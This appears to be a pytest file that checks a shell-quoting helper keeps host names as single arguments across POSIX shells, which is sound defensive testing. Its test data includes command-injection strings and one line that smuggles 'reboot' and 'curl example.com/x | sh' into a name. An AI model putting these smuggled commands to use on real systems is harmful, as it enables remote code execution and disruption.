"""A host name in a suggested command is one argument in every POSIX shell.

The commands procdiag suggests are pasted into whatever shell the operator has
(dash is ``/bin/sh`` on Debian and Ubuntu), so a name must never split into
several commands there, and must not carry a backtick that ends the code span
the command sits in.
"""

from __future__ import annotations

import pytest
from shellrun import SHELLS

from procdiag.core.util import shell_quote

HOSTILE = [
    "plain",
    "my app",
    "a'b",
    "a`b",
    "`",
    "'",
    "'`",
    "`'",
    "``",
    "a$b",
    "$HOME",
    "$(touch x)",
    "`touch x`",
    "'; touch x; #",
    "x'; touch x; #`",
    "`; touch x; #'",
    "'$(touch x)'`",
    "a\nb",
    "'\n`",
    "x\n'; touch x #`",
    "back\\slash",
    "\\'`",
    "\\`",
    "-rf",
    "*",
    "~",
    "",
    "日本語'`名前",
    "a b'c`d$e\nf\\g;h|i&j",
]


@pytest.mark.parametrize("shell", SHELLS)
@pytest.mark.parametrize("name", HOSTILE, ids=repr)
def test_the_name_reaches_the_command_as_one_argument(stubs, shell, name):
    pasted = stubs.paste(shell, f"probe -- {shell_quote(name)}")
    assert pasted.stderr == ""
    assert pasted.calls == [("probe", ["--", name])]


@pytest.mark.parametrize("shell", SHELLS)
@pytest.mark.parametrize("name", HOSTILE, ids=repr)
def test_the_name_is_one_argument_in_the_middle_of_a_pipeline(stubs, shell, name):
    pasted = stubs.paste(
        shell, f"probe -a {shell_quote(name)}/x | sort -rh | head; probe -b"
    )
    assert pasted.calls == [("probe", ["-a", name + "/x"]), ("probe", ["-b"])]


@pytest.mark.parametrize("name", HOSTILE, ids=repr)
def test_the_quoted_word_has_no_backtick_to_end_a_code_span(name):
    assert "`" not in shell_quote(name)


@pytest.mark.parametrize("shell", SHELLS)
def test_a_name_cannot_run_the_commands_it_spells(stubs, shell):
    name = "x'; touch /tmp/pwned; reboot #`; curl example.com/x | sh; `"
    pasted = stubs.paste(shell, f"probe {shell_quote(name)}")
    assert [c for c, _ in pasted.calls] == ["probe"]
